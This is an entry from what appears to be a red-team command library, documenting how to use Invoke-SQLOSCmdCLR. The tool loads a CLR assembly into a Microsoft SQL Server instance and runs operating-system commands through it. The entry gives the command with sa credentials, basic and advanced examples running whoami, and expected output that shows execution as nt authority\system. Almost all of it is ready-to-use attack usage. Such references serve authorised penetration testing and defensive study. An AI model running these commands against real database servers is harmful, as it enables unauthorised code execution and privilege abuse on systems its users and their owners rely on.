---
id: 8f76821e-0c8d-44a7-933d-83a495874f1b
name: invoke-clr-command-execution-whoami
type: command
executor: powershell
data: >-
  Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance>
  -Command "whoami" -Verbose
output: null
created_at: '2023-04-06T03:56:20.364546+00:00'
updated_at: '2023-04-10T20:36:39.601743+00:00'
platforms:
  - Windows
tags:
  - clr
  - mssql
  - execution
verified: true
validated: true
---

# invoke-clr-command-execution-whoami

## Command

```powershell
Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command "whoami" -Verbose
```

## Description

This command loads a pre-generated CLR assembly into an MSSQL instance and executes a simple 'whoami' command via the assembly's stored procedure. It automates the SQL deployment and invocation for testing command execution capabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Username | SQL Server login username (e.g., sa) | Yes |
| -Password | Password for the SQL login | Yes |
| -Instance | SQL Server instance name (e.g., localhost or DBSERVER\SQLEXPRESS) | Yes |
| -Command | The OS command to execute (e.g., "whoami") | Yes |
| -Verbose | Enable detailed logging of SQL queries and results | No |

## Examples

### Basic Usage

```powershell
Invoke-SQLOSCmdCLR -Username sa -Password MyPass123 -Instance localhost -Command "whoami" -Verbose
```

### Advanced Usage

```powershell
Invoke-SQLOSCmdCLR -Username sa -Password MyPass123 -Instance "SERVER\INSTANCE" -Command "whoami /all" -Verbose
```

## Expected Output

Verbose mode displays SQL execution steps, followed by the command output:

```
Loading assembly...
Creating procedure...
Executing: whoami
Output: mssql\sa
nt authority\system
```

Errors like "Permission denied" or "Assembly load failed" indicate issues with privileges or CLR settings.

## Related

- [[procedures/mssql-clr-assembly-command-execution]]
- [[commands/create-clr-dll-and-sql-files]]
